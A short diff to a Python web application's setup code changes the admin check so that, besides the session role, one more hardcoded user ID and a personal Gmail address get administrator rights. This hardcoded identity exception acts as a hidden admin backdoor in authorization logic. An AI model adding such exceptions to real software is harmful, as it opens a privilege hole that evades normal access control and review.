@@ -702,7 +702,7 @@ def create_app(config=None, engine=None, providers=None):
 
             u = c.execute(select(users).where(users.c.id == user_id)).mappings().first()
 
-        is_admin = session.get('role') == 'admin' or user_id == 'usr_owner_default' or (u and u['email'] == 'admin@toomi.vn')
+        is_admin = session.get('role') == 'admin' or user_id in ('usr_owner_default', 'usr_27e2530c-2ea') or (u and u['email'] in ('admin@toomi.vn', 'khuongtran227@gmail.com'))
         user_info = {
             'id': user_id,
             'email': u['email'] if u else 'admin@toomi.vn',
